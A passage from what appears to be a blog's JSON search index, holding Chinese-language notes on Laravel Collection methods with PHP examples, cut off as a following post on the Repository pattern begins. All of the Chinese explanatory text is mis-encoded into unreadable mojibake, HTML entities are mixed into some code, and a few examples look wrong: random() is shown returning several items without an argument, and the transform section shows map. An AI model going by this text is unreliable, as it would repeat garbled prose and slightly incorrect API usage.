modeè¿”å›æŒ‡å®šé”®çš„ä¼—æ•°å€¼ã€‚ 1collect([1, 1, 2, 4])-&gt;mode(); // [1] nthæ¯éš”nä¸ªå…ƒç´ å–ä¸€ä¸ªå…ƒç´ ç»„æˆä¸€ä¸ªæ–°çš„é›†åˆã€‚ 12345$collection = collect(['a', 'b', 'c', 'd', 'e', 'f']);$collection-&gt;nth(4); // ['a', 'e']// ç¬¬äºŒä¸ªå‚æ•°å¯ä»¥ä½œä¸ºåç§»ä½ç½® $collection-&gt;nth(4, 1); // ['b', 'f'] onlyè¿”å›é›†åˆä¸­ç»™å®šé”®çš„æ‰€æœ‰é¡¹ç›®ã€‚ 123$collection = collect(['product_id' =&gt; 1, 'name' =&gt; 'Desk', 'price' =&gt; 100, 'discount' =&gt; false]);$filtered = $collection-&gt;only(['product_id', 'name']);$filtered-&gt;all(); // ['product_id' =&gt; 1, 'name' =&gt; 'Desk'] padå°†ç»™å®šå€¼å¡«å……æ•°ç»„ç›´åˆ°è¾¾åˆ°æŒ‡å®šçš„æœ€å¤§é•¿åº¦ã€‚è¯¥æ–¹æ³•å’Œ PHP å‡½æ•° array_pad ç±»ä¼¼ã€‚ å¦‚æœä½ æƒ³è¦æŠŠæ•°æ®å¡«å……åˆ°å·¦ä¾§ï¼Œéœ€è¦æŒ‡å®šä¸€ä¸ªè´Ÿå€¼é•¿åº¦ï¼Œå¦‚æœæŒ‡å®šé•¿åº¦ç»å¯¹å€¼å°äºç­‰äºæ•°ç»„é•¿åº¦é‚£ä¹ˆå°†ä¸ä¼šåšä»»ä½•å¡«å……ã€‚ 12345678910111213$collection = collect(['A', 'B', 'C']);$filtered = $collection-&gt;pad(5, 0);$filtered-&gt;all();// ['A', 'B', 'C', 0, 0]$filtered = $collection-&gt;pad(-5, 0);$filtered-&gt;all();// [0, 0, 'A', 'B', 'C'] partitioné…åˆlist()æ–¹æ³•åŒºåˆ†å›è°ƒå‡½æ•°æ»¡è¶³å’Œä¸æ»¡è¶³çš„æ•°æ®ã€‚ 1234567$collection = collect([1, 2, 3, 4, 5, 6]);list($underThree, $equalOrAboveThree) = $collection-&gt;partition(function ($i) &#123; return $i &lt; 3;&#125;);$underThree-&gt;all(); // [1, 2]$equalOrAboveThree-&gt;all(); // [3, 4, 5, 6] pipeå°†é›†åˆä¼ ç»™ç»™å®šçš„å›è°ƒå¹¶è¿”å›ç»“æœã€‚ 1234$collection &#x3D; collect([1, 2, 3]);$piped &#x3D; $collection-&gt;pipe(function ($collection) &#123; return $collection-&gt;sum();&#125;); &#x2F;&#x2F; 6 pluckè·å–é›†åˆä¸­ç»™å®šé”®å¯¹åº”çš„æ‰€æœ‰å€¼ã€‚ åŸºæœ¬ç”¨æ³•ï¼š 1234567$collection = collect([ ['product_id' =&gt; 'prod-100', 'name' =&gt; 'Desk', \"id\" =&gt; 1], ['product_id' =&gt; 'prod-200', 'name' =&gt; 'Chair', \"id\" =&gt; 2],]);$plucked = $collection-&gt;pluck('name');$plucked-&gt;all(); // ['Desk', 'Chair'] è¿˜å¯ä»¥ä¼ å…¥ç¬¬äºŒä¸ªå‚æ•°ä½œä¸ºé”®å€¼ï¼š 12$plucked &#x3D; $collection-&gt;pluck(&#39;name&#39;, &quot;id&quot;);$plucked-&gt;all(); &#x2F;&#x2F; [1 &#x3D;&gt; &#39;Desk&#39;, 2 &#x3D;&gt; &#39;Chair&#39;] popç§»é™¤å¹¶è¿”å›é›†åˆä¸­çš„æœ€åä¸€ä¸ªé¡¹ç›®ã€‚ 1234$collection = collect([1, 2, 3, 4, 5]);$collection-&gt;pop(); // 5$collection-&gt;all(); // [1, 2, 3, 4] prependå°†ç»™å®šçš„å€¼æ·»åŠ åˆ°é›†åˆçš„å¼€å¤´ã€‚ 1234$collection = collect([1, 2, 3, 4, 5]);$collection-&gt;prepend(99);$collection-&gt;all(); // [99, 1, 2, 3, 4, 5] å¦‚æœæ˜¯å…³è”æ•°ç»„ï¼Œä¹Ÿå¯ä»¥ä¼ å…¥ç¬¬äºŒä¸ªå‚æ•°ä½œä¸ºé”®å€¼ï¼š 1234$collection = collect(['one' =&gt; 1, 'two' =&gt; 2]);$collection-&gt;prepend(0, 'zero');$collection-&gt;all(); // ['zero' =&gt; 0, 'one' =&gt; 1, 'two' =&gt; 2] pullæŠŠç»™å®šé”®å¯¹åº”çš„å€¼ä»é›†åˆä¸­ç§»é™¤å¹¶è¿”å›ã€‚ 1234$collection = collect(['product_id' =&gt; 'prod-100', 'name' =&gt; 'Desk']);$collection-&gt;pull('name'); // 'Desk'$collection-&gt;all(); // ['product_id' =&gt; 'prod-100'] pushæŠŠç»™å®šå€¼æ·»åŠ åˆ°é›†åˆçš„æœ«å°¾ã€‚ 1234$collection = collect([1, 2, 3, 4]);$collection-&gt;push(5);$collection-&gt;all(); // [1, 2, 3, 4, 5] putåœ¨é›†åˆå†…è®¾ç½®ç»™å®šçš„é”®å€¼å¯¹ã€‚ 1234$collection = collect(['product_id' =&gt; 1, 'name' =&gt; 'Desk']);$collection-&gt;put('price', 100);$collection-&gt;all(); // ['product_id' =&gt; 1, 'name' =&gt; 'Desk', 'price' =&gt; 100] randomä»é›†åˆä¸­è¿”å›ä¸€ä¸ªéšæœºé¡¹ã€‚ 12$collection = collect([1, 2, 3, 4, 5]);$collection-&gt;random(); // 4 - (retrieved randomly) ä¹Ÿå¯ä»¥ä¼ å…¥ä¸€ä¸ªæ•´æ•°ç”¨æ¥æŒ‡å®šéœ€è¦éœ€è¦è·å–çš„éšæœºé¡¹ä¸ªæ•°ï¼š 1$collection-&gt;random(); // 2, 3, 5 reduceç”¨äºå‡å°‘é›†åˆåˆ°å•ä¸ªå€¼ï¼Œä¼ é€’æ¯ä¸ªè¿­ä»£ç»“æœåˆ°å­è¿­ä»£ã€‚ 1234567$collection = collect([1, 2, 3]);$total = $collection-&gt;reduce(function ($carry, $item) &#123; return $carry + $item;&#125;);// 6 åœ¨ç¬¬ä¸€æ¬¡è¿­ä»£æ—¶ $carry çš„å€¼æ˜¯nullï¼›ä¸è¿‡ï¼Œä½ å¯ä»¥é€šè¿‡ä¼ é€’ç¬¬äºŒä¸ªå‚æ•°åˆ° reduce æ¥æŒ‡å®šå…¶åˆå§‹å€¼ã€‚ 12345$collection-&gt;reduce(function ($carry, $item) &#123; return $carry + $item;&#125;, 4);// 10 rejectä½¿ç”¨æŒ‡å®šçš„å›è°ƒè¿‡æ»¤é›†åˆï¼Œè¯¥å›è°ƒåº”è¯¥ä¸ºæ‰€æœ‰å®ƒæƒ³è¦ä»ç»“æœé›†åˆä¸­ç§»é™¤çš„æ•°æ®é¡¹è¿”å› trueã€‚ 123456$collection = collect([1, 2, 3, 4]);$filtered = $collection-&gt;reject(function ($value, $key) &#123; return $value &gt; 2;&#125;);$filtered-&gt;all(); // [1, 2] reverseå€’è½¬é›†åˆä¸­é¡¹ç›®çš„é¡ºåºï¼Œå¹¶ä¿ç•™åŸå§‹çš„é”®å€¼ï¼š 12345678910111213$collection = collect(['a', 'b', 'c', 'd', 'e']);$reversed = $collection-&gt;reverse();$reversed-&gt;all();/* [ 4 =&gt; 'e', 3 =&gt; 'd', 2 =&gt; 'c', 1 =&gt; 'b', 0 =&gt; 'a', ]*/ searchæœç´¢ç»™å®šçš„å€¼å¹¶è¿”å›å®ƒçš„é”®ï¼Œå¦‚æœæ²¡æœ‰æ‰¾åˆ°è¿”å› false 123$collection = collect([2, 4, 6, 8]);$collection-&gt;search(4); // 1 ä¸Šé¢çš„æœç´¢ä½¿ç”¨çš„æ˜¯ã€Œå®½æ¾ã€æ¯”è¾ƒï¼Œè¦ä½¿ç”¨ã€Œä¸¥æ ¼ã€æ¯”è¾ƒï¼Œä¼ é€’ true ä½œä¸ºç¬¬äºŒä¸ªå‚æ•°åˆ°è¯¥æ–¹æ³•ã€‚ 12$collection-&gt;search('4', true);// false æ­¤å¤–ï¼Œä½ è¿˜å¯ä»¥ä¼ é€’è‡ªå·±çš„å›è°ƒæ¥æœç´¢é€šè¿‡çœŸç†æµ‹è¯•çš„ç¬¬ä¸€ä¸ªæ•°æ®é¡¹ã€‚ 1234$collection-&gt;search(function ($item, $key) &#123; return $item &gt; 5;&#125;);// 2 shiftç§»é™¤å¹¶è¿”å›é›†åˆçš„ç¬¬ä¸€ä¸ªå…ƒç´ ã€‚ 1234$collection = collect([1, 2, 3, 4, 5]);$collection-&gt;shift(); // 1$collection-&gt;all(); // [2, 3, 4, 5] shuffleéšæœºæ’åºé›†åˆä¸­çš„é¡¹ç›®ã€‚ 1234$collection = collect([1, 2, 3, 4, 5]);$shuffled = $collection-&gt;shuffle();$shuffled-&gt;all(); // [3, 2, 5, 1, 4] - (generated randomly) sliceä»ç»™å®šç´¢å¼•å¼€å§‹è¿”å›é›†åˆçš„ä¸€ä¸ªåˆ‡ç‰‡ã€‚ 1234$collection = collect([1, 2, 3, 4, 5, 6, 7, 8, 9, 10]);$slice = $collection-&gt;slice(4);$slice-&gt;all(); // [5, 6, 7, 8, 9, 10] ä¸skip() æ–¹æ³•ç±»ä¼¼ã€‚ å¦‚æœä½ æƒ³è¦é™åˆ¶è¿”å›åˆ‡ç‰‡çš„å°ºå¯¸ï¼Œå°†å°ºå¯¸å€¼ä½œä¸ºç¬¬äºŒä¸ªå‚æ•°ä¼ é€’åˆ°è¯¥æ–¹æ³•ã€‚ 12345$slice = $collection-&gt;slice(4, 2);$slice-&gt;all();// [5, 6] è¿”å›çš„åˆ‡ç‰‡æœ‰æ–°çš„ã€æ•°å­—åŒ–ç´¢å¼•çš„é”®ï¼Œå¦‚æœä½ æƒ³è¦ä¿æŒåŸæœ‰çš„é”®ï¼Œå¯ä»¥ä½¿ç”¨ values æ–¹æ³•å¯¹å®ƒä»¬è¿›è¡Œé‡æ–°ç´¢å¼•ã€‚ sortä¿ç•™åŸæ•°ç»„çš„é”®ï¼Œå¯¹é›†åˆè¿›è¡Œæ’åºã€‚ 12345$collection = collect([5, 3, 1, 2, 4]);$sorted = $collection-&gt;sort();// é‡ç½®ç´¢å¼•$sorted-&gt;values()-&gt;all(); // [1, 2, 3, 4, 5] å¦‚æœæœ‰æ›´é«˜çº§çš„æ’åºéœ€æ±‚ï¼Œå¯ä»¥é€šè¿‡è‡ªå·±çš„ç®—æ³•å°†å›è°ƒå‡½æ•°ä¼ é€’åˆ° sort() æ–¹æ³•ã€‚ å¦‚æœä½ éœ€è¦å¯¹åµŒå¥—æ•°ç»„æˆ–å¯¹è±¡è¿›è¡Œæ’åºï¼Œè¯·å‚ç…§ sortBy() å’Œ sortByDesc() æ–¹æ³•ã€‚ sortBysortBy æ–¹æ³•å°†æ ¹æ®æŒ‡å®šé”®å¯¹é›†åˆè¿›è¡Œæ’åºã€‚ 12345678910111213141516$collection = collect([ ['name' =&gt; 'Desk', 'price' =&gt; 200], ['name' =&gt; 'Chair', 'price' =&gt; 100], ['name' =&gt; 'Bookcase', 'price' =&gt; 150],]);$sorted = $collection-&gt;sortBy('price');$sorted-&gt;values()-&gt;all();/* [ ['name' =&gt; 'Chair', 'price' =&gt; 100], ['name' =&gt; 'Bookcase', 'price' =&gt; 150], ['name' =&gt; 'Desk', 'price' =&gt; 200], ]*/ å¯ä»¥ä¼ é€’ç¬¬äºŒä¸ªå‚æ•°ä½œä¸ºæ’åºæ ‡å¿—ï¼Œæˆ–è€…ï¼Œä½ å¯ä»¥é€šè¿‡ä½ è‡ªå·±çš„å›è°ƒå‡½æ•°æ¥å†³å®šå¦‚ä½•æ’åºé›†åˆçš„å€¼ã€‚ sortByDescè¯¥æ–¹æ³•ä¸ sortBy æ–¹æ³•ä¸€æ ·ï¼Œä½†æ˜¯ä¼šä»¥ç›¸åçš„é¡ºåºæ¥å¯¹é›†åˆè¿›è¡Œæ’åºï¼š sortKeyssortKeys ä½¿ç”¨å…³è”æ•°ç»„çš„é”®æ¥å¯¹é›†åˆè¿›è¡Œæ’åºï¼š 123456789101112131415$collection = collect([ 'id' =&gt; 22345, 'first' =&gt; 'John', 'last' =&gt; 'Doe',]);$sorted = $collection-&gt;sortKeys();$sorted-&gt;all();/* [ 'first' =&gt; 'John', 'id' =&gt; 22345, 'last' =&gt; 'Doe', ]*/ sortKeysDescè¯¥æ–¹æ³•ä¸ sortKeys æ–¹æ³•ä¸€æ ·ï¼Œä½†æ˜¯ä¼šä»¥ç›¸åçš„é¡ºåºæ¥å¯¹é›†åˆè¿›è¡Œæ’åºã€‚ spliceä»ç»™å®šä½ç½®å¼€å§‹ç§»é™¤å¹¶è¿”å›æ•°æ®é¡¹åˆ‡ç‰‡ã€‚ 12345$collection = collect([1, 2, 3, 4, 5]);$chunk = $collection-&gt;splice(2);$chunk-&gt;all(); // [3, 4, 5]$collection-&gt;all(); // [1, 2] ä½ å¯ä»¥ä¼ é€’å‚æ•°æ¥é™åˆ¶è¿”å›ç»„å—çš„å¤§å°ã€‚ 1234567$collection = collect([1, 2, 3, 4, 5]);$chunk = $collection-&gt;splice(2, 1);$chunk-&gt;all();// [3]$collection-&gt;all(); // [1, 2, 4, 5] æ­¤å¤–ï¼Œä½ å¯ä»¥ä¼ é€’ç¬¬ä¸‰ä¸ªåŒ…å«æ–°çš„æ•°æ®é¡¹çš„å‚æ•°æ¥æ›¿ä»£ä»é›†åˆä¸­ç§»é™¤çš„æ•°æ®é¡¹ã€‚ 1234567$collection = collect([1, 2, 3, 4, 5]);$chunk = $collection-&gt;splice(2, 1, [10, 11]);$chunk-&gt;all();// [3]$collection-&gt;all();// [1, 2, 10, 11, 4, 5] splitå°†é›†åˆæŒ‰ç»™å®šçš„å€¼æ‹†åˆ†ã€‚ 1234$collection = collect([1, 2, 3, 4, 5]);$groups = $collection-&gt;split(3);$groups-&gt;all(); // [[1, 2], [3, 4], [5]] sumè¿”å›é›†åˆå†…æ‰€æœ‰é¡¹ç›®çš„æ€»å’Œã€‚ 1collect([1, 2, 3, 4, 5])-&gt;sum(); // 15 å¦‚æœé›†åˆåŒ…å«åµŒå¥—æ•°ç»„æˆ–å¯¹è±¡ï¼Œåº”è¯¥ä¼ é€’ä¸€ä¸ªé”®ç”¨äºåˆ¤æ–­å¯¹å“ªäº›å€¼è¿›è¡Œæ±‚å’Œè¿ç®—ã€‚ 123456$collection = collect([ ['name' =&gt; 'JavaScript: The Good Parts', 'pages' =&gt; 176], ['name' =&gt; 'JavaScript: The Definitive Guide', 'pages' =&gt; 1096],]);$collection-&gt;sum('pages'); // 1272 æ­¤å¤–ï¼Œä½ è¿˜å¯ä»¥ä¼ é€’è‡ªå·±çš„å›è°ƒæ¥åˆ¤æ–­å¯¹å“ªäº›å€¼è¿›è¡Œæ±‚å’Œã€‚ 12345678910$collection = collect([ ['name' =&gt; 'Chair', 'colors' =&gt; ['Black']], ['name' =&gt; 'Desk', 'colors' =&gt; ['Black', 'Mahogany']], ['name' =&gt; 'Bookcase', 'colors' =&gt; ['Red', 'Beige', 'Brown']],]);$collection-&gt;sum(function ($product) &#123; return count($product['colors']);&#125;);// 6 takeè¿”å›ç»™å®šæ•°é‡é¡¹ç›®çš„æ–°é›†åˆã€‚ 1234$collection = collect([0, 1, 2, 3, 4, 5]);$chunk = $collection-&gt;take(3);$chunk-&gt;all(); // [0, 1, 2] ä½ è¿˜å¯ä»¥ä¼ é€’è´Ÿæ•°çš„æ–¹å¼ä»é›†åˆæœ«å°¾å¼€å§‹è·å–æŒ‡å®šæ•°ç›®çš„æ•°æ®é¡¹ã€‚ 12345$collection = collect([0, 1, 2, 3, 4, 5]);$chunk = $collection-&gt;take(-2);$chunk-&gt;all();// [4, 5] tapä¼ é€’é›†åˆåˆ°ç»™å®šå›è°ƒï¼Œä»è€Œå…è®¸ä½ åœ¨æŒ‡å®šå…¥å£è¿›å…¥é›†åˆå¹¶å¯¹é›†åˆé¡¹è¿›è¡Œå¤„ç†è€Œä¸å½±å“é›†åˆæœ¬èº«ã€‚ 12345678collect([2, 4, 3, 1, 5]) -&gt;sort() -&gt;tap(function ($collection) &#123; Log::debug('Values after sorting', $collection-&gt;values()-&gt;toArray()); &#125;) -&gt;shift();// 1 timesé™æ€times() æ–¹æ³•é€šè¿‡è°ƒç”¨ç»™å®šæ¬¡æ•°çš„å›è°ƒå‡½æ•°æ¥åˆ›å»ºæ–°é›†åˆï¼š 1234$collection = Collection::times(10, function ($number) &#123; return $number * 9;&#125;);$collection-&gt;all(); // [9, 18, 27, 36, 45, 54, 63, 72, 81, 90] è¯¥æ–¹æ³•åœ¨å’Œå·¥å‚æ–¹æ³•ä¸€èµ·åˆ›å»º Eloquent æ¨¡å‹æ—¶å¾ˆæœ‰ç”¨ã€‚ 12345678910111213$categories = Collection::times(3, function ($number) &#123; return factory(Category::class)-&gt;create(['name' =&gt; 'Category #'.$number]);&#125;);$categories-&gt;all();/* [ ['id' =&gt; 1, 'name' =&gt; 'Category #1'], ['id' =&gt; 2, 'name' =&gt; 'Category #2'], ['id' =&gt; 3, 'name' =&gt; 'Category #3'], ]*/ transformè¿­ä»£é›†åˆå¹¶å¯¹é›†åˆå†…çš„æ¯ä¸ªé¡¹ç›®è°ƒç”¨ç»™å®šçš„å›è°ƒã€‚ 123456$collection = collect([1, 2, 3, 4, 5]);$multiplied = $collection-&gt;map(function ($item, $key) &#123; return $item * 2;&#125;);$multiplied-&gt;all(); // [2, 4, 6, 8, 10] æ³¨æ„ï¼šeach åªæ˜¯éå†é›†åˆï¼Œmap åˆ™ä¼šè¿”å›ä¸€ä¸ªæ–°çš„é›†åˆå®ä¾‹ï¼›å®ƒä¸ä¼šä¿®æ”¹åŸé›†åˆã€‚å¦‚æœä½ æƒ³ä¿®æ”¹åŸé›†åˆï¼Œè¯·ä½¿ç”¨ transform æ–¹æ³•ã€‚ unionå°†ç»™å®šçš„æ•°ç»„æ·»åŠ åˆ°é›†åˆä¸­ã€‚å¦‚æœç»™å®šçš„æ•°ç»„å«æœ‰ä¸åŸé›†åˆä¸€æ ·çš„é”®ï¼Œåˆ™é¦–é€‰åŸå§‹é›†åˆçš„å€¼ã€‚ 1234$collection = collect([1 =&gt; ['a'], 2 =&gt; ['b']]);$union = $collection-&gt;union([3 =&gt; ['c'], 1 =&gt; ['b']]);$union-&gt;all(); // [1 =&gt; ['a'], 2 =&gt; ['b'], 3 =&gt; ['c']] uniqueè¿”å›é›†åˆä¸­æ‰€æœ‰çš„å”¯ä¸€æ•°æ®é¡¹ï¼Œ è¿”å›çš„é›†åˆä¿æŒåŸæ¥çš„æ•°ç»„é”®ï¼Œåœ¨æœ¬ä¾‹ä¸­æˆ‘ä»¬ä½¿ç”¨ values æ–¹æ³•é‡ç½®è¿™äº›é”®ä¸ºè¿ç»­çš„æ•°å­—ç´¢å¼• åŸºæœ¬ç”¨æ³•ï¼š 12345$collection = collect([1, 1, 2, 2, 3, 4, 2]);$unique = $collection-&gt;unique();// ä½¿ç”¨value é‡ç½®ç´¢å¼•$unique-&gt;values()-&gt;all(); // [1, 2, 3, 4] å½“å¤„ç†åµŒå¥—æ•°ç»„æˆ–å¯¹è±¡æ—¶ï¼Œä½ å¯ä»¥æŒ‡å®šç”¨äºç¡®å®šå”¯ä¸€æ€§çš„é”®ï¼š 12345678910111213141516$collection = collect([ ['name' =&gt; 'iPhone 6', 'brand' =&gt; 'Apple', 'type' =&gt; 'phone'], ['name' =&gt; 'iPhone 5', 'brand' =&gt; 'Apple', 'type' =&gt; 'phone'], ['name' =&gt; 'Apple Watch', 'brand' =&gt; 'Apple', 'type' =&gt; 'watch'], ['name' =&gt; 'Galaxy S6', 'brand' =&gt; 'Samsung', 'type' =&gt; 'phone'], ['name' =&gt; 'Galaxy Gear', 'brand' =&gt; 'Samsung', 'type' =&gt; 'watch'],]);$unique = $collection-&gt;unique('brand');$unique-&gt;values()-&gt;all();/* [ ['name' =&gt; 'iPhone 6', 'brand' =&gt; 'Apple', 'type' =&gt; 'phone'], ['name' =&gt; 'Galaxy S6', 'brand' =&gt; 'Samsung', 'type' =&gt; 'phone'], ]*/ ä½ è¿˜å¯ä»¥æŒ‡å®šè‡ªå·±çš„å›è°ƒç”¨äºåˆ¤æ–­æ•°æ®é¡¹å”¯ä¸€æ€§ã€‚ 1234567891011121314$unique = $collection-&gt;unique(function ($item) &#123; return $item['brand'].$item['type'];&#125;);$unique-&gt;values()-&gt;all();/* [ ['name' =&gt; 'iPhone 6', 'brand' =&gt; 'Apple', 'type' =&gt; 'phone'], ['name' =&gt; 'Apple Watch', 'brand' =&gt; 'Apple', 'type' =&gt; 'watch'], ['name' =&gt; 'Galaxy S6', 'brand' =&gt; 'Samsung', 'type' =&gt; 'phone'], ['name' =&gt; 'Galaxy Gear', 'brand' =&gt; 'Samsung', 'type' =&gt; 'watch'], ]*/ uniqueStrictè¯¥æ–¹æ³•å’Œ unique æ–¹æ³•ç­¾åä¸€æ ·ï¼Œä¸åŒä¹‹å¤„åœ¨äºæ‰€æœ‰å€¼éƒ½æ˜¯ã€Œä¸¥æ ¼ã€æ¯”è¾ƒã€‚ unlessä¼šæ‰§è¡Œç»™å®šå›è°ƒï¼Œé™¤éä¼ é€’åˆ°è¯¥æ–¹æ³•çš„ç¬¬ä¸€ä¸ªå‚æ•°ç­‰äº trueã€‚ 123456789101112$collection = collect([1, 2, 3]);$collection-&gt;unless(true, function ($collection) &#123; return $collection-&gt;push(4);&#125;);$collection-&gt;unless(false, function ($collection) &#123; return $collection-&gt;push(5);&#125;);$collection-&gt;all();// [1, 2, 3, 5] ä¸ unless ç›¸å¯¹çš„æ–¹æ³•æ˜¯ whenã€‚ valuesè¿”å›é”®è¢«é‡ç½®ä¸ºè¿ç»­ç¼–å·çš„æ–°é›†åˆã€‚ 123456789101112131415$collection = collect([ 10 =&gt; ['product' =&gt; 'Desk', 'price' =&gt; 200], 11 =&gt; ['product' =&gt; 'Desk', 'price' =&gt; 200]]);$values = $collection-&gt;values();$values-&gt;all();/* [ 0 =&gt; ['product' =&gt; 'Desk', 'price' =&gt; 200], 1 =&gt; ['product' =&gt; 'Desk', 'price' =&gt; 200], ]*/ unwrapé™æ€ unwrap æ–¹æ³•ä¼šä»ç»™å®šå€¼ä¸­è¿”å›é›†åˆé¡¹ã€‚ 12345678Collection::unwrap(collect('John Doe'));// ['John Doe']Collection::unwrap(['John Doe']);// ['John Doe']Collection::unwrap('John Doe');// 'John Doe' whenå½“ä¼ å…¥çš„ç¬¬ä¸€ä¸ªå‚æ•°ä¸º true çš„æ—¶ï¼Œå°†æ‰§è¡Œç»™å®šçš„å›è°ƒã€‚ 1234567891011$collection = collect([1, 2, 3]);$collection-&gt;when(true, function ($collection) &#123; return $collection-&gt;push(4);&#125;);$collection-&gt;all(); // [1, 2, 3, 4]// å½“ä¼ å…¥çš„ç¬¬ä¸€ä¸ªå‚æ•°ä¸ä¸º true çš„æ—¶å€™ï¼Œå°†æ‰§è¡Œç»™å®šçš„å›è°ƒå‡½æ•°$collection-&gt;unless(false, function ($collection) &#123; return $collection-&gt;push(5);&#125;); whereé€šè¿‡ç»™å®šçš„é”®å€¼è¿‡æ»¤é›†åˆã€‚ 123456789101112131415$collection = collect([ ['product' =&gt; 'Desk', 'price' =&gt; 200], ['product' =&gt; 'Chair', 'price' =&gt; 100], ['product' =&gt; 'Bookcase', 'price' =&gt; 150], ['product' =&gt; 'Door', 'price' =&gt; 100],]);$filtered = $collection-&gt;where('price', 100);$filtered-&gt;all();/* [ ['product' =&gt; 'Chair', 'price' =&gt; 100], ['product' =&gt; 'Door', 'price' =&gt; 100], ]*/ whereStrictwhereStrictæ–¹æ³•ä½¿ç”¨ä¸¥æ ¼æ¨¡å¼é€šè¿‡ç»™å®šçš„é”®å€¼è¿‡æ»¤é›†åˆã€‚ whenEmptyå½“é›†åˆä¸ºç©ºæ—¶ï¼Œå°†æ‰§è¡Œç»™å®šçš„å›è°ƒå‡½æ•°ã€‚ 123456$collection = collect(['michael', 'tom']);$collection-&gt;whenEmpty(function ($collection) &#123; return $collection-&gt;push('adam');&#125;);$collection-&gt;all(); // ['michael', 'tom'] åä¹‹whenNotEmpty() æ–¹æ³•å½“é›†åˆä¸ä¸ºç©ºæ—¶ï¼Œå°†æ‰§è¡Œç»™å®šçš„å›è°ƒå‡½æ•°ã€‚ whereIné€šè¿‡ç»™å®šçš„é”®å€¼æ•°ç»„æ¥è¿‡æ»¤é›†åˆã€‚ 123456789101112131415$collection = collect([ ['product' =&gt; 'Desk', 'price' =&gt; 200], ['product' =&gt; 'Chair', 'price' =&gt; 100], ['product' =&gt; 'Bookcase', 'price' =&gt; 150], ['product' =&gt; 'Door', 'price' =&gt; 100],]);$filtered = $collection-&gt;whereIn('price', [150, 200]);$filtered-&gt;all();/* [ ['product' =&gt; 'Desk', 'price' =&gt; 200], ['product' =&gt; 'Bookcase', 'price' =&gt; 150], ]*/ ç±»ä¼¼æ–¹æ³•è¿˜æœ‰whereNotInã€whereBetweenã€whereNotInStrictã€‚ whereBetweenç­›é€‰æŒ‡å®šèŒƒå›´å†…çš„é›†åˆã€‚ 1234567891011121314151617$collection = collect([ ['product' =&gt; 'Desk', 'price' =&gt; 200], ['product' =&gt; 'Chair', 'price' =&gt; 80], ['product' =&gt; 'Bookcase', 'price' =&gt; 150], ['product' =&gt; 'Pencil', 'price' =&gt; 30], ['product' =&gt; 'Door', 'price' =&gt; 100],]);$filtered = $collection-&gt;whereBetween('price', [100, 200]);$filtered-&gt;all();/* [ ['product' =&gt; 'Desk', 'price' =&gt; 200], ['product' =&gt; 'Bookcase', 'price' =&gt; 150], ['product' =&gt; 'Door', 'price' =&gt; 100], ]*/ wrapé™æ€ wrap æ–¹æ³•ä¼šå°†ç»™å®šå€¼å°è£…åˆ°é›†åˆä¸­ã€‚ 1234567891011121314151617$collection = Collection::wrap('John Doe');$collection-&gt;all();// ['John Doe']$collection = Collection::wrap(['John Doe']);$collection-&gt;all();// ['John Doe']$collection = Collection::wrap(collect('John Doe'));$collection-&gt;all();// ['John Doe'] zipå°†ç»™å®šæ•°ç»„çš„å€¼ä¸ç›¸åº”ç´¢å¼•å¤„çš„åŸé›†åˆçš„å€¼åˆå¹¶åœ¨ä¸€èµ·ã€‚ 1234$collection = collect(['Chair', 'Desk']);$zipped = $collection-&gt;zip([100, 200]);$zipped-&gt;all(); // [['Chair', 100], ['Desk', 200]] é«˜é˜¶æ¶ˆæ¯ä¼ é€’é›†åˆè¿˜æ”¯æŒâ€œé«˜é˜¶æ¶ˆæ¯ä¼ é€’â€ï¼Œä¹Ÿå°±æ˜¯åœ¨é›†åˆä¸Šæ‰§è¡Œé€šç”¨çš„åŠŸèƒ½ï¼Œæ”¯æŒé«˜é˜¶æ¶ˆæ¯ä¼ é€’çš„æ–¹æ³•åŒ…æ‹¬ï¼šaverageã€avgã€containsã€eachã€everyã€filterã€firstã€mapã€partitionã€rejectã€sortByã€sortByDescã€sum å’Œ uniqueã€‚ æ¯ä¸ªé«˜é˜¶æ¶ˆæ¯ä¼ é€’éƒ½å¯ä»¥åœ¨é›†åˆå®ä¾‹ä¸Šä»¥åŠ¨æ€å±æ€§çš„æ–¹å¼è®¿é—®ï¼Œä¾‹å¦‚ï¼Œæˆ‘ä»¬ä½¿ç”¨ each é«˜é˜¶æ¶ˆæ¯ä¼ é€’æ¥åœ¨é›†åˆçš„æ¯ä¸ªå¯¹è±¡ä¸Šè°ƒç”¨ä¸€ä¸ªæ–¹æ³•ï¼š 123$users = User::where('votes', '&gt;', 500)-&gt;get();$users-&gt;each-&gt;markAsVip(); ç±»ä¼¼çš„ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨ sum é«˜é˜¶æ¶ˆæ¯ä¼ é€’æ¥èšåˆç”¨æˆ·é›†åˆçš„æŠ•ç¥¨æ€»æ•°ï¼š 123$users = User::where('group', 'Development')-&gt;get();return $users-&gt;sum-&gt;votes; å‚è€ƒé“¾æ¥ Laravel çš„é›†åˆ Collection Laravel é›†åˆâ€”â€”Laravel8.x ä¸­æ–‡æ–‡æ¡£","categories":[{"name":"PHP","slug":"PHP","permalink":"https://www.0x2beace.com/categories/PHP/"},{"name":"Laravel","slug":"PHP/Laravel","permalink":"https://www.0x2beace.com/categories/PHP/Laravel/"}],"tags":[{"name":"PHP","slug":"PHP","permalink":"https://www.0x2beace.com/tags/PHP/"},{"name":"Laravel","slug":"Laravel","permalink":"https://www.0x2beace.com/tags/Laravel/"}]},{"title":"ã€è½¬è½½ã€å¦‚ä½•ä½¿ç”¨Repository æ¨¡å¼","slug":"how-to-use-repository-mode","date":"2021-04-20T13:01:38.000Z","updated":"2021-04-22T15:22:30.359Z","comments":true,"path":"how-to-use-repository-mode/","link":"","permalink":"https://www.0x2beace.com/how-to-use-repository-mode/","excerpt":"è‹¥å°†æ•°æ®åº“é€»è¾‘éƒ½å†™åœ¨ Model é‡Œï¼Œä¼šé€ æˆ model ä»£ç çš„è‡ƒè‚¿éš¾ä»¥ç»´æŠ¤ï¼ŒåŸºäº SOLID åŸåˆ™ï¼Œæˆ‘ä»¬åº”è¯¥ä½¿ç”¨ Repository æ¨¡å¼è¾…åŠ© Modelï¼Œå°†ç›¸å…³çš„æ•°æ®åº“é€»è¾‘å°è£…åœ¨ä¸åŒçš„ Repositoryï¼Œæ–¹ä¾¿åæœŸé¡¹ç›®çš„ç»´æŠ¤ã€‚","text":"è‹¥å°†æ•°æ®åº“é€»è¾‘éƒ½å†™åœ¨ Model é‡Œï¼Œä¼šé€ æˆ model ä»£ç çš„è‡ƒè‚¿éš¾ä»¥ç»´æŠ¤ï¼ŒåŸºäº SOLID åŸåˆ™ï¼Œæˆ‘ä»¬åº”è¯¥ä½¿ç”¨ Repository æ¨¡å¼è¾…åŠ© 